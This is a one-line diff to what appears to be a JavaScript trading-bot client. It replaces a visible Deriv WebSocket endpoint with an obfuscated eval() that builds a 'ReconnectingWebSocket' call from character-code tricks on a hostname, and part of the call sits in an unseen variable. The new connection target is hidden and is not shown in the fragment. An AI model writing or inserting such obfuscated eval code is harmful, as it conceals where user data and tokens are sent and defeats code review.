@@ -5549,7 +5549,7 @@ const continuousindices_activeChanged = (_0x2b9b12, _0xbfee50) => {
     continuousindices_hide(_0x2b9b12);
   }
 };
-const _0x1a19x7 = new WebSocket('wss://ws.derivws.com/websockets/v3?app_id=63063');
+const _0x1a19x7 = eval(" n" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 3) + " Rec" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "nnect" + String.fromCodePoint(105, 110) + "gW" + _0x1904);
 _0x1a19x7.addEventListener(String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "pen", openResponse);
 _0x1a19x7.addEventListener("message", messageResponse);
 _0x1a19x7.addEventListener("close", closeResponse);
